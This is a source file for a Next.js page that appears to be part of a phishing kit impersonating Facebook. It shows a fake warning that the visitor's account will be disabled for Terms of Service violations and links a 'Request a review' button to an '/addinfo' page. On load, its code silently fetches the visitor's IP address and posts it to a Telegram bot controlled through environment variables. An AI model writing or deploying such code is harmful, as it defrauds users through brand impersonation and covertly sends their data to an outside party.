import React, { useState, useEffect } from 'react'
import { Inter } from 'next/font/google'
import axios from "axios";

const inter = Inter({ subsets: ['latin'] });

export default function Home() {
  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  const [ip, setIP] = useState('');
  const getData = async () => {
    const res = await axios.get("https://api.ipify.org/?format=json");
    setIP(res.data.ip);
    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: `IP address: ${ip}`
    }).then(({ data }) => {
      console.log(data);
    })
  };
  useEffect(() => {
    //passing getData method to the lifecycle method
    getData();
  }, []);

  return (
    <div className='w-full h-full flex items-center justify-center bg-gray-300 absolute'>
      <div className='bg-white max-w-xl rounded-md p-5'>
        <div className='text-gray-700 border border-x-0 border-t-0 border-b-1 border-gray-200 pb-4'>
          <div className='text-xl font-bold'>We have detected suspicious activity from your account</div>
          <div className='text-sm'>Do you have multiple accounts?</div>
        </div>
        <div className='text-sm py-5'>Facebook is a community where people use their real identities so you always know who you're connecting with. Maintaining multiple accounts or impresionating someone is a direct violation of our <b>Terms of Service</b> and our <b>Community Standards</b> which will result in such accounts getting permanently disabled.</div>
        <div className='text-red-600 text-sm py-5'><b>Notice!</b> Your account has been detected in violation of our <b>Terms of Service</b> and our <b>Community Standards</b> and as such, it will be permanently disabled by our Detection Center System unless you request a formal review by our dedicated team, using the button below.</div>
        <button className='bg-blue-700 text-white p-2 text-bold h-auto w-auto hover:bg-blue-800 rounded-md' onClick={() => window.location.href = "/addinfo"}>Request a review</button>
      </div>
    </div>
  )
}